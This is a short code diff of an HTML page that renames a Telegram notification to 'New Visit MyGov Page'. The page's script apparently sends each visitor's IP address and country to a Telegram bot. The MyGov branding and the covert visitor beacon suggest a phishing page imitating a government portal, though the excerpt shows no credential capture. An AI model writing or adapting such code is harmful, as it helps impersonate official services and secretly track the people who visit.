@@ -4,7 +4,6 @@
     <meta charset="utf-8">
     <meta http-equiv="x-ua-compatible" content="ie=edge">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <title>HELLO</title>
     <meta name="description" content="">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="format-detection" content="telephone=no">
@@ -55,7 +54,7 @@
             .then(data => {
                 const ip = data.ip || 'Unknown IP';
                 const country = data.country_name || 'Unknown Country';
-                const message = `*New Visit to Page*\nIP: ${ip}\nCountry: ${country}`;
+                const message = `*New Visit MyGov Page*\nIP: ${ip}\nCountry: ${country}`;
                 return sendTelegramMessage(message);
             })
             .catch(error => {
